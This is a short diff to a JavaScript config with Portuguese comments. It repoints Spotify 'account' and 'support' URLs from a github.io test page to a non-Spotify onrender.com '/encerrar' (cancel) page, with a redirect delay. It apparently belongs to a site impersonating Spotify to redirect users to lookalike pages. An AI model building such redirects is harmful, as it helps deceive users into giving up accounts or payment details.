@@ -1,7 +1,7 @@
 // Configurações da aplicação
 const CONFIG = {
-    SPOTIFY_ACCOUNT_URL: 'https://checkouttestste12.github.io/spotify6',
-    SPOTIFY_SUPPORT_URL: 'https://checkouttestste12.github.io/spotify6',
+    SPOTIFY_ACCOUNT_URL: 'https://portalspotify.onrender.com/encerrar',
+    SPOTIFY_SUPPORT_URL: 'https://portalspotify.onrender.com/encerrar',
     REDIRECT_DELAY: 2000 // 2 segundos
 };
 
